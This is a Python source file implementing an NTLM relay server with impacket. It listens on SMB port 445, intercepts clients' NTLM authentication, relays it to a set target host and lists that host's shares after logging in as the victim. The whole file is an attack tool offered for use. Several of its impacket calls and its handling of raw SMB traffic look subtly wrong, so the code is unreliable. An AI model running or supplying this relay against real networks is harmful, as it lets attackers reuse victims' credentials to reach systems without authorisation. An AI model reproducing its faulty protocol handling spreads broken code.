import socket
import threading
import logging
from impacket import smb, nmb, ntlm
from impacket.smbconnection import SMBConnection
from impacket.spnego import SPNEGO_NegTokenInit, SPNEGO_NegTokenResp

class NTLMRelayServer:
    def __init__(self, listen_address='0.0.0.0', listen_port=445):
        self.listen_address = listen_address
        self.listen_port = listen_port
        self.running = False
        self.server_socket = None
        self.clients = []
        self.lock = threading.Lock()
        self.logger = logging.getLogger(__name__)
        self.server_thread = None
        self.target = None

    def set_target(self, target):
        """Set the target for NTLM relay"""
        self.target = target
        self.logger.info(f"[+] Target set to: {target}")

    def start(self):
        """Start the NTLM Relay Server"""
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.listen_address, self.listen_port))
            self.server_socket.listen(5)
            
            self.running = True
            self.server_thread = threading.Thread(target=self._accept_connections, daemon=True)
            self.server_thread.start()
            
            self.logger.info(f"[+] NTLM Relay Server listening on {self.listen_address}:{self.listen_port}")
            
        except Exception as e:
            self.logger.error(f"[-] Failed to start server: {e}")
            self.stop()
            raise

    def _accept_connections(self):
        """Accept incoming connections"""
        while self.running:
            try:
                client, address = self.server_socket.accept()
                self.logger.info(f"[+] Connection from {address[0]}:{address[1]}")
                
                with self.lock:
                    self.clients.append(client)
                
                client_thread = threading.Thread(
                    target=self._handle_relay_authentication,
                    args=(client, address),
                    daemon=True
                )
                client_thread.start()
                
            except Exception as e:
                if self.running:
                    self.logger.error(f"[-] Error accepting connection: {e}")
                break

    def _handle_relay_authentication(self, client_socket, address):
        """Handle the NTLM relay authentication process"""
        try:
            # Get NTLM Type 1 from client
            ntlm_nego = self._receive_ntlm_message(client_socket)
            if not ntlm_nego:
                return
            self.logger.info("[+] NTLM Type 1 received from client")

            # Connect to target and relay Type 1
            target_conn = self._connect_to_target()
            if not target_conn:
                return
                
            target_challenge = self._relay_to_target(target_conn, ntlm_nego)
            if not target_challenge:
                return
            self.logger.info("[+] Received Type 2 challenge from target")

            # Send challenge to client and get response
            auth_response = self._get_auth_response(client_socket, target_challenge)
            if not auth_response:
                return
            self.logger.info("[+] Got Type 3 auth response from client")

            # Relay the authentication to target
            if self._authenticate_target(target_conn, auth_response):
                self.logger.info("[+] Successfully authenticated to target!")
                self._execute_commands(target_conn)
            else:
                self.logger.error("[-] Authentication to target failed")

        except Exception as e:
            self.logger.error(f"[-] Relay authentication failed: {e}")
        finally:
            with self.lock:
                if client_socket in self.clients:
                    self.clients.remove(client_socket)
            client_socket.close()

    def _receive_ntlm_message(self, client_socket):
        """Receive NTLM message from client"""
        try:
            data = client_socket.recv(4096)
            if b'NTLMSSP' in data:
                return data
            return None
        except Exception as e:
            self.logger.error(f"[-] Error receiving NTLM message: {e}")
            return None

    def _connect_to_target(self):
        """Establish connection to target"""
        if not self.target:
            self.logger.error("[-] No target specified")
            return None
            
        try:
            target_conn = SMBConnection(self.target, self.target)
            return target_conn
        except Exception as e:
            self.logger.error(f"[-] Failed to connect to target: {e}")
            return None

    def _relay_to_target(self, target_conn, ntlm_nego):
        """Relay NTLM Type 1 message to target and get challenge"""
        try:
            challenge = target_conn.sendNegotiate(ntlm_nego)
            return challenge
        except Exception as e:
            self.logger.error(f"[-] Failed to relay to target: {e}")
            return None

    def _get_auth_response(self, client_socket, challenge):
        """Get Type 3 message from client"""
        try:
            client_socket.send(challenge)
            auth_response = client_socket.recv(4096)
            if b'NTLMSSP' in auth_response:
                return auth_response
            return None
        except Exception as e:
            self.logger.error(f"[-] Failed to get auth response: {e}")
            return None

    def _authenticate_target(self, target_conn, auth_response):
        """Authenticate to target with Type 3 message"""
        try:
            return target_conn.sendAuth(auth_response)
        except Exception as e:
            self.logger.error(f"[-] Authentication failed: {e}")
            return False

    def _execute_commands(self, target_conn):
        """Execute commands on successful authentication"""
        try:
            self.logger.info("[+] Listing shares on target:")
            shares = target_conn.listShares()
            for share in shares:
                self.logger.info(f"    - {share['shi1_netname']}")
        except Exception as e:
            self.logger.error(f"[-] Failed to execute commands: {e}")

    def stop(self):
        """Stop the NTLM Relay Server"""
        self.running = False
        
        with self.lock:
            for client in self.clients:
                try:
                    client.close()
                except:
                    pass
            self.clients.clear()
        
        if self.server_socket:
            try:
                self.server_socket.shutdown(socket.SHUT_RDWR)
            except:
                pass
            finally:
                self.server_socket.close()
                self.server_socket = None

        if self.server_thread and self.server_thread.is_alive():
            self.server_thread.join(timeout=1.0)
            
        self.logger.info("[*] NTLM Relay Server stopped")